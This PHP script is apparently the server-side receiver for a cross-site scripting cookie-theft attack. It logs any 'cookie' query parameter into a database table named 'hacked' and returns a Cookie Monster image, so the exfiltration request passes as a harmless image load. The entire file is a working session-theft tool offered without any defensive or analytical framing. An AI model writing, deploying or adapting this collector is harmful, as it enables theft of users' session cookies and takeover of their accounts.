<?php


ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


include_once("config.php");

try {

    $conn = new PDO("mysql:host=$servername;dbname=zap", $username, $password);

    /* $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ATTR_ERRMODE_EXEPTION);*/

} catch (PDOException $e) {
    echo "failed connection" . $e->getMessage();
}


if (isset($_GET['cookie'])){


       $sql = "INSERT INTO hacked (data) VALUES (?)";
        $stmt= $conn->prepare($sql);
        $stmt->execute([$_GET['cookie']]);


    $imageURL = 'https://longislandweekly.com/wp-content/uploads/2019/11/Cookie-Monster-cookie-crumbs.jpg';
    $ch = curl_init($imageURL);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    $data = curl_exec($ch);
    curl_close($ch);

    if ($data === false) {
        die('cURL failed');
    }

    header('Content-Type: image/png');
    header('Content-Length: ' . curl_getinfo( $ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD ) );
    echo $data;



}else{
    $imageURL = 'https://longislandweekly.com/wp-content/uploads/2019/11/Cookie-Monster-cookie-crumbs.jpg';
    $ch = curl_init($imageURL);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    $data = curl_exec($ch);
    curl_close($ch);

    if ($data === false) {
        die('cURL failed');
    }

    header('Content-Type: image/png');
    header('Content-Length: ' . curl_getinfo( $ch, CURLINFO_CONTENT_LENGTH_DOWNLOAD ) );
    echo $data;
}